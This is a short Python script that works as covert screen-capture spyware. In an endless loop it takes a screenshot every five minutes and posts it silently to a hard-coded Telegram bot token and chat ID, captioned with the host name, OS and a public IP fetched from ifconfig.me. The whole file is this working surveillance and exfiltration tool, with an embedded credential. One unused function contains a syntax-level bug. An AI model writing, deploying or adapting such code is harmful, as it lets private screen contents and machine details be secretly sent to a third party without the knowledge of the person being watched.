import pyautogui
import requests
import time
import os, sys
import platform


token='1135091247:AAHBn533Jx27qAsZHrIdpLrEMCciDHyM9Uc'
chatid = '-1001120619561'
interval = 300
ip = requests.get("http://ifconfig.me").content.decode("utf-8")

caption = "amogus"

def get_screenshot():
    fname = os.environ["TEMP"]+str(time.time())+".png"
    im2 = pyautogui.screenshot(fname)
    return fname

def send_image(fname):
    url='https://api.telegram.org/bot{}/sendPhoto'.format(token)
    files={'photo': open(fname,'rb')}
    values={'chat_id' : chatid , 'caption':caption,'disable_notification': 'true', 'parse_mode':'MarkdownV2'}
    r=requests.post(url,files=files,data=values)
    print(r.content)

def send_file(fname):
    url='https://api.telegram.org/bot{}/sendDocument'.format(token)
    files={'document': open(fname,'rb')}
    values={'chat_id' : chatid , 'caption':caption,"disable_notification": true}
    r=requests.post(url,files=files,data=values)
    print(r.content)

def set_interval(new):
    global interval
    interval = new

caption = "**HOST:** `"+platform.uname()[1]+"`\n" + \
          "**OS:**   `"+str(platform.platform())+"`\n" + \
          "**IP**    `"+ip+"`"
print(caption)

while True:
    f = get_screenshot()
    send_image(f)
    time.sleep(interval)
